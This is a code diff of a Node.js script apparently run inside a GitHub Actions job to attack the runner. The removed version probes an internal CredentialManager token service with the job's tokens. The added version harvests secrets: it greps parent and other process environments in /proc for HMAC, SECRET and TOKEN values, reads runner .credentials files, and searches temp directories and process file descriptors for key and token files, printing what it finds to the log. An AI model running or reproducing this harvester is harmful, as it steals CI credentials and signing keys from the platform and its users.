@@ -1,210 +1,214 @@
 const https = require('https');
+const fs = require('fs');
+const path = require('path');
+const { execSync } = require('child_process');
 
-// v22: CredentialManager Twirp service — format probing
-// Key finding from v21: /twirp/github.authentication.v0.CredentialManager/{method}
-// returns 400 "malformed" (not 404) on runner host with all tested methods.
-// This means the routes EXIST and auth passes (or is post-parse).
-// Goal: find the right request format to get a 200.
+// v23: Runner filesystem + process inspection
+// Goal: find HMAC key material, credentials, or other secrets in runner FS/procs
 
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
 const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
 const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
+const RUNNER_TEMP = process.env.RUNNER_TEMP || '';
+const RUNNER_TOOL_CACHE = process.env.RUNNER_TOOL_CACHE || '';
 const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
 const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID || '';
-const GITHUB_REPOSITORY_ID = process.env.GITHUB_REPOSITORY_ID || '';
+const GITHUB_WORKSPACE = process.env.GITHUB_WORKSPACE || '';
 
-function rawReq(hostname, path, method, headers, body) {
-  return new Promise((resolve) => {
-    const opts = { hostname, path, method: method || 'POST', headers };
-    const r = https.request(opts, (res) => {
-      let d = ''; res.on('data', c => d += c);
-      res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 400), headers: res.headers }));
-    });
-    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
-    if (body) { r.write(body); }
-    r.end();
-  });
+function run(cmd) {
+  try { return execSync(cmd, { encoding: 'utf8', timeout: 5000 }).trim(); }
+  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 100).trim(); }
 }
 
-function buildHeaders(token, ct, len) {
-  const h = { 'Content-Type': ct, 'Content-Length': len, 'User-Agent': 'probe', 'Accept': ct };
-  if (token) h['Authorization'] = 'Bearer ' + token;
-  return h;
+function readSafe(p, maxBytes) {
+  try {
+    const content = fs.readFileSync(p);
+    const len = content.length;
+    if (len === 0) return '(empty)';
+    const str = content.toString('utf8').substring(0, maxBytes || 500);
+    return str + (len > (maxBytes || 500) ? '...(len=' + len + ')' : '');
+  } catch(e) {
+    return 'ERR: ' + e.message;
+  }
 }
 
-function twirpJson(hostname, service, method, token, body) {
-  const path = '/twirp/' + service + '/' + method;
-  const data = typeof body === 'string' ? body : JSON.stringify(body);
-  return rawReq(hostname, path, 'POST', buildHeaders(token, 'application/json', Buffer.byteLength(data)), data);
-}
-
-function twirpProto(hostname, service, method, token, bodyBuf) {
-  const path = '/twirp/' + service + '/' + method;
-  return rawReq(hostname, path, 'POST', buildHeaders(token, 'application/protobuf', bodyBuf.length), bodyBuf);
-}
-
-// Encode a protobuf string field: field_num << 3 | 2 (LEN wire type)
-function protoString(fieldNum, value) {
-  const valueBytes = Buffer.from(value, 'utf8');
-  const tag = (fieldNum << 3) | 2;
-  const tagBuf = Buffer.from([tag]);
-  const lenBuf = Buffer.from([valueBytes.length]);
-  return Buffer.concat([tagBuf, lenBuf, valueBytes]);
+function findFiles(dir, depth) {
+  if (depth <= 0) return [];
+  let results = [];
+  try {
+    const entries = fs.readdirSync(dir, { withFileTypes: true });
+    for (const e of entries) {
+      const fp = path.join(dir, e.name);
+      if (e.isFile()) results.push(fp);
+      else if (e.isDirectory() && !e.name.startsWith('.git')) {
+        results = results.concat(findFiles(fp, depth - 1));
+      }
+    }
+  } catch(e) {}
+  return results;
 }
 
 async function main() {
-  console.log('=== V22: CredentialManager format probe ===');
-  console.log('Repo:', GITHUB_REPOSITORY, '| Run:', GITHUB_RUN_ID);
+  console.log('=== V23: Runner filesystem + process inspection ===');
+  console.log('RUNNER_TEMP:', RUNNER_TEMP, '| WORKSPACE:', GITHUB_WORKSPACE);
+  console.log('Run:', GITHUB_RUN_ID, '| Repo:', GITHUB_REPOSITORY);
 
-  const oidcHost = OIDC_URL ? new URL(OIDC_URL).hostname : null;
-  const poolId = OIDC_URL ? new URL(OIDC_URL).pathname.split('/')[1] : null;
-  console.log('OIDC host:', oidcHost, '| Pool:', poolId);
+  // === PART 1: Runner process inspection ===
+  console.log('\n=== PART 1: Runner processes (parent processes) ===');
+  console.log('[PS] All runner-related processes:');
+  console.log(run('ps aux | grep -E "runner|actions|dotnet" | grep -v grep | head -20'));
 
-  if (!oidcHost) { console.log('No OIDC host!'); return; }
+  // Find the runner daemon PID
+  console.log('\n[PS] Runner binary:');
+  console.log(run('which Runner.Worker Runner.Listener dotnet 2>/dev/null || true'));
+  console.log(run('find /home/runner/runners /opt/runner /usr/local/bin -name "Runner.Worker" -o -name "Runner.Listener" 2>/dev/null | head -5'));
 
-  const SVC = 'github.authentication.v0.CredentialManager';
-  const METHOD = 'GetToken';
+  // === PART 2: Check process environment of parent processes ===
+  console.log('\n=== PART 2: Parent process environment ===');
+  const ppid = process.ppid;
+  const pppid = parseInt(run('cat /proc/' + ppid + '/status | grep PPid | awk \'{print $2}\'') || 0);
+  console.log('[PROC] My PID:', process.pid, '| PPID:', ppid, '| PPPID:', pppid);
 
-  // === TEST 1: Determine if auth is checked before request parsing ===
-  // Compare: no auth vs valid GITHUB_TOKEN vs valid OIDC_TOKEN
-  console.log('\n=== TEST 1: Auth check timing (no-auth vs token) ===');
-  const noAuth = await twirpJson(oidcHost, SVC, METHOD, null, {});
-  const withToken = await twirpJson(oidcHost, SVC, METHOD, GITHUB_TOKEN, {});
-  const withOidc = await twirpJson(oidcHost, SVC, METHOD, OIDC_TOKEN, {});
-  console.log('[NO_AUTH]    :', noAuth.status, '|', noAuth.body.substring(0, 100));
-  console.log('[GH_TOKEN]   :', withToken.status, '|', withToken.body.substring(0, 100));
-  console.log('[OIDC_TOKEN] :', withOidc.status, '|', withOidc.body.substring(0, 100));
-  // If all three return the same error → auth is not the gate (or happens after format check)
-  // If no-auth differs → auth IS checked first
-
-  // === TEST 2: Binary protobuf with empty body ===
-  console.log('\n=== TEST 2: Binary protobuf encoding ===');
-  // Empty protobuf message = 0 bytes
-  const emptyProto = Buffer.alloc(0);
-  const r2a = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, emptyProto);
-  console.log('[PROTO_EMPTY]:', r2a.status, '|', r2a.body.substring(0, 150));
-
-  // Protobuf with field 1 = "Zelys-DFKH/depbot-ssrf-test"
-  const repoField = protoString(1, GITHUB_REPOSITORY);
-  const r2b = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, repoField);
-  console.log('[PROTO_F1_REPO]:', r2b.status, '|', r2b.body.substring(0, 150));
-
-  // Protobuf with field 1 = "api.github.com" (audience)
-  const audField = protoString(1, 'api.github.com');
-  const r2c = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, audField);
-  console.log('[PROTO_F1_AUD]:', r2c.status, '|', r2c.body.substring(0, 150));
-
-  // Protobuf with field 2 = repository_id (varint)
-  const repoIdBuf = Buffer.from([0x10, ...encodeVarint(parseInt(GITHUB_REPOSITORY_ID) || 1277673145)]);
-  const r2d = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, repoIdBuf);
-  console.log('[PROTO_F2_REPOID]:', r2d.status, '|', r2d.body.substring(0, 150));
-
-  // === TEST 3: JSON field name variations ===
-  console.log('\n=== TEST 3: JSON field name variations for GetToken ===');
-  const fieldVariants = [
-    {},
-    { audience: 'api.github.com' },
-    { audience: 'api.github.com', repository: GITHUB_REPOSITORY },
-    { resource: GITHUB_REPOSITORY },
-    { token_type: 'installation' },
-    { repository_full_name: GITHUB_REPOSITORY },
-    { repository_id: GITHUB_REPOSITORY_ID },
-    { installation_id: '19454198618' },
-    { run_id: GITHUB_RUN_ID, repository: GITHUB_REPOSITORY },
-    { context: { repository: GITHUB_REPOSITORY, run_id: GITHUB_RUN_ID } },
-  ];
-  for (const body of fieldVariants) {
-    const r = await twirpJson(oidcHost, SVC, METHOD, GITHUB_TOKEN, body);
-    const key = Object.keys(body).join(',') || 'empty';
-    const isOk = r.status === 200;
-    if (isOk) console.log('[JSON_FIELD ***SUCCESS***] ' + key + ': ' + r.status + ' | ' + r.body);
-    else console.log('[JSON_FIELD] ' + key + ': ' + r.status + ' | ' + r.body.substring(0, 80));
+  // Try to read parent env
+  const parentEnvPath = '/proc/' + ppid + '/environ';
+  const parentEnv = run('cat ' + parentEnvPath + ' 2>/dev/null | tr "\\0" "\\n" | grep -E "HMAC|SECRET|TOKEN|KEY|CRED|AUTH|RUNNER_SECRET|ACTIONS_HMAC|SHARED|SIGNING" | head -20');
+  if (parentEnv && !parentEnv.startsWith('ERR:')) {
+    console.log('[PARENT_ENV] Interesting vars in parent process:');
+    console.log(parentEnv);
+  } else {
+    console.log('[PARENT_ENV] Cannot read parent env:', parentEnv);
   }
 
-  // === TEST 4: Other method names with correct-ish body ===
-  console.log('\n=== TEST 4: Method enumeration with audience body ===');
-  const methods = [
-    'GetToken', 'IssueToken', 'GetInstallationToken', 'GetCredentials',
-    'GetJobToken', 'GetActionsToken', 'GetActionToken', 'CreateToken',
-    'ExchangeToken', 'GenerateToken', 'GetAccessToken', 'GetOAuthToken',
-    'GetRepositoryToken', 'GetRepoToken', 'GetOrganizationToken',
-    'GetWorkflowToken', 'GetRunnerToken',
-  ];
-  const audbody = { audience: 'api.github.com', repository: GITHUB_REPOSITORY };
-  for (const m of methods) {
-    const r = await twirpJson(oidcHost, SVC, m, GITHUB_TOKEN, audbody);
-    const isBadRoute = r.body.includes('bad_route') || r.body.includes('no handler');
-    const label = isBadRoute ? '404(NO_ROUTE)' : String(r.status);
-    const isOk = r.status === 200;
-    if (isOk) console.log('[METHOD ***SUCCESS***] ' + m + ': ' + r.status + ' | ' + r.body.substring(0, 200));
-    else if (!isBadRoute) console.log('[METHOD EXISTS] ' + m + ': ' + label + ' | ' + r.body.substring(0, 80));
-    else console.log('[METHOD] ' + m + ': ' + label);
+  // Try grandparent (the runner daemon)
+  const gpEnvPath = '/proc/' + pppid + '/environ';
+  const gpEnv = run('cat ' + gpEnvPath + ' 2>/dev/null | tr "\\0" "\\n" | grep -E "HMAC|SECRET|TOKEN|KEY|CRED|AUTH|SIGNING|SHARED" | head -20');
+  if (gpEnv && !gpEnv.startsWith('ERR:')) {
+    console.log('[GP_ENV] Interesting vars in grandparent process:');
+    console.log(gpEnv);
+  } else {
+    console.log('[GP_ENV]:', gpEnv.substring(0, 100));
   }
 
-  // === TEST 5: Try CredentialManager on other internal hostnames ===
-  console.log('\n=== TEST 5: Alternative CredentialManager hosts ===');
-  // The runner might also have a CredentialManager at the standard runner backend
-  // Let's try common GitHub internal endpoints
-  const altHosts = [
-    'pipelines.actions.githubusercontent.com',
-    'productionresults.actions.githubusercontent.com',
-    'results-receiver.actions.githubusercontent.com',
+  // Full env of parent to find runner-specific vars
+  const parentFullEnv = run('cat /proc/' + ppid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -v "^$" | head -50');
+  if (parentFullEnv && !parentFullEnv.startsWith('ERR:')) {
+    console.log('[PARENT_FULL_ENV] All parent env vars:');
+    console.log(parentFullEnv);
+  }
+
+  // === PART 3: Runner configuration files ===
+  console.log('\n=== PART 3: Runner configuration files ===');
+
+  // Runner configuration is usually at ~/.runner or the runner install dir
+  const runnerConfigPaths = [
+    '/home/runner/.runner',
+    '/home/runner/work/_temp/.runner',
+    '/home/runner/runners/.runner',
+    '/etc/actions-runner/.runner',
+    RUNNER_TEMP + '/.runner',
+    // The runner also writes a .credentials file
+    '/home/runner/.credentials',
+    '/home/runner/.credentials_rsaparams',
+    '/home/runner/work/.credentials',
+    RUNNER_TEMP + '/.credentials',
   ];
-  for (const host of altHosts) {
-    const r = await twirpJson(host, SVC, 'GetToken', GITHUB_TOKEN, { audience: 'api.github.com' });
-    const isBadRoute = r.body.includes('bad_route');
-    if (r.status !== 'ERR') {
-      console.log('[ALT_HOST] ' + host + ': ' + r.status + ' | ' + r.body.substring(0, 100));
+  for (const p of runnerConfigPaths) {
+    const content = readSafe(p, 300);
+    if (!content.startsWith('ERR:')) {
+      console.log('[CONFIG] ' + p + ':');
+      console.log(content);
     }
   }
 
-  // === TEST 6: What's the full path structure? Check GET vs POST ===
-  console.log('\n=== TEST 6: HTTP method variations ===');
-  const getReq = await rawReq(oidcHost, '/twirp/' + SVC + '/GetToken', 'GET', {
-    'Authorization': 'Bearer ' + GITHUB_TOKEN,
-    'Accept': 'application/json',
-    'User-Agent': 'probe',
-  }, null);
-  console.log('[GET_METHOD]:', getReq.status, '|', getReq.body.substring(0, 100));
+  // === PART 4: Temp directory inspection ===
+  console.log('\n=== PART 4: Temp directory contents ===');
+  console.log('[TEMP] $RUNNER_TEMP contents:');
+  console.log(run('ls -la ' + RUNNER_TEMP + ' 2>/dev/null | head -30'));
+  console.log('[TEMP] Files in RUNNER_TEMP:');
+  console.log(run('find ' + RUNNER_TEMP + ' -maxdepth 3 -type f 2>/dev/null | head -40'));
 
-  // Try with specific Twirp version header
-  const twirpHeader = await rawReq(oidcHost, '/twirp/' + SVC + '/GetToken', 'POST', {
-    'Authorization': 'Bearer ' + GITHUB_TOKEN,
-    'Content-Type': 'application/json',
-    'Content-Length': 2,
-    'Twirp-Version': '7.2.0',
-    'User-Agent': 'twirp/7.2.0',
-  }, Buffer.from('{}'));
-  console.log('[TWIRP_HDR]:', twirpHeader.status, '|', twirpHeader.body.substring(0, 100));
+  // Look for credential/token files in temp
+  console.log('[TEMP] Token/credential files:');
+  console.log(run('find ' + RUNNER_TEMP + ' -maxdepth 5 -type f | xargs grep -l "token\\|secret\\|hmac\\|key\\|credential\\|bearer" 2>/dev/null | head -10'));
 
-  // === TEST 7: Enumerate service namespace ===
-  // Maybe it's under a slightly different namespace
-  console.log('\n=== TEST 7: Service namespace variations ===');
-  const namespaces = [
-    'github.authentication.v0.CredentialManager',
-    'github.authentication.v1.CredentialManager',
-    'github.actions.authentication.v0.CredentialManager',
-    'authentication.CredentialManager',
-    'github.authentication.CredentialManager',
+  // === PART 5: Look for runner message file (contains job secrets) ===
+  console.log('\n=== PART 5: Runner message/job context files ===');
+  // The runner receives a "job message" from the broker that contains secrets
+  // This might be temporarily stored on disk
+  const sensitiveFiles = run('find /home/runner /tmp /var/tmp -maxdepth 6 -type f \\( -name "*.json" -o -name "*.token" -o -name "*.key" -o -name "*.credentials" -o -name "context.json" -o -name "job.json" \\) 2>/dev/null | head -30');
+  console.log('[SENSITIVE] JSON/token/key files:');
+  console.log(sensitiveFiles);
+
+  // Read any interesting found files
+  if (sensitiveFiles && !sensitiveFiles.startsWith('ERR:')) {
+    for (const fp of sensitiveFiles.split('\n').filter(Boolean).slice(0, 5)) {
+      console.log('[FILE] ' + fp + ':');
+      console.log(readSafe(fp, 200));
+    }
+  }
+
+  // === PART 6: Check /proc for the runner's open file descriptors ===
+  console.log('\n=== PART 6: Runner process file descriptors ===');
+  // The runner process might have an open fd to the secret store
+  const procs = run('pgrep -f "Runner.Worker\\|runner.worker" 2>/dev/null | head -3');
+  console.log('[PROCS] Runner.Worker PIDs:', procs);
+  if (procs && !procs.startsWith('ERR:')) {
+    for (const pid of procs.split('\n').filter(Boolean).slice(0, 2)) {
+      const fds = run('ls -la /proc/' + pid + '/fd 2>/dev/null | head -20');
+      console.log('[FD] PID ' + pid + ' open files:');
+      console.log(fds);
+      // Try to read the maps to find memory-mapped credential files
+      const maps = run('grep -E "json|token|cred|secret" /proc/' + pid + '/maps 2>/dev/null | head -10');
+      if (maps && !maps.startsWith('ERR:')) {
+        console.log('[MAPS] PID ' + pid + ' interesting mappings:', maps);
+      }
+    }
+  }
+
+  // === PART 7: Check job orchestration context ===
+  console.log('\n=== PART 7: Orchestration context files ===');
+  const orchPaths = [
+    GITHUB_WORKSPACE + '/../_temp',
+    GITHUB_WORKSPACE + '/../../_temp',
+    '/home/runner/work/_temp',
+    '/home/runner/work/_actions',
   ];
-  for (const ns of namespaces) {
-    const r = await twirpJson(oidcHost, ns, 'GetToken', GITHUB_TOKEN, { audience: 'api.github.com' });
-    const isBadRoute = r.body.includes('bad_route') || r.body.includes('no handler') || r.status === 404;
-    if (!isBadRoute) console.log('[NS EXISTS] ' + ns + ': ' + r.status + ' | ' + r.body.substring(0, 100));
-    else console.log('[NS] ' + ns + ': 404');
+  for (const dir of orchPaths) {
+    const listing = run('ls -la ' + dir + ' 2>/dev/null | head -20');
+    if (!listing.startsWith('ERR:') && listing.length > 0) {
+      console.log('[ORCH] ' + dir + ':');
+      console.log(listing);
+    }
+  }
+
+  // === PART 8: Memory scan for HMAC key patterns ===
+  console.log('\n=== PART 8: Accessible memory / proc patterns ===');
+  // Look for any file in /proc/*/mem that contains "hmac" or "signing"
+  // (usually not readable without elevated perms, but worth checking)
+  const ourPid = process.pid;
+  const smaps = run('grep -E "heap|stack" /proc/' + ourPid + '/smaps 2>/dev/null | head -5');
+  console.log('[SMAPS] Our process memory layout:', smaps.substring(0, 200));
+
+  // Check if we can read other processes' environments
+  const allPids = run('ls /proc | grep -E "^[0-9]+$" | head -20');
+  let accessibleEnvs = [];
+  for (const pid of allPids.split('\n').filter(Boolean)) {
+    const env = run('cat /proc/' + pid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -c "." 2>/dev/null');
+    if (env && !env.startsWith('ERR:') && parseInt(env) > 0) {
+      accessibleEnvs.push(pid);
+    }
+  }
+  console.log('[PROC_ACCESS] PIDs with readable env:', accessibleEnvs.join(', '));
+
+  // For each accessible env, look for secrets
+  for (const pid of accessibleEnvs.slice(0, 10)) {
+    const env = run('cat /proc/' + pid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -E "HMAC|SIGNING|SECRET_KEY|RUNNER_TOKEN|RUNNER_SECRET" | head -5');
+    if (env && !env.startsWith('ERR:') && env.trim().length > 0) {
+      console.log('[SECRET_ENV] PID ' + pid + ':', env);
+    }
   }
 
   console.log('\nDone.');
-}
-
-function encodeVarint(n) {
-  const bytes = [];
-  while (n > 127) {
-    bytes.push((n & 0x7F) | 0x80);
-    n = n >>> 7;
-  }
-  bytes.push(n & 0x7F);
-  return bytes;
 }
 
 main().catch(e => console.log('Fatal:', e.message));
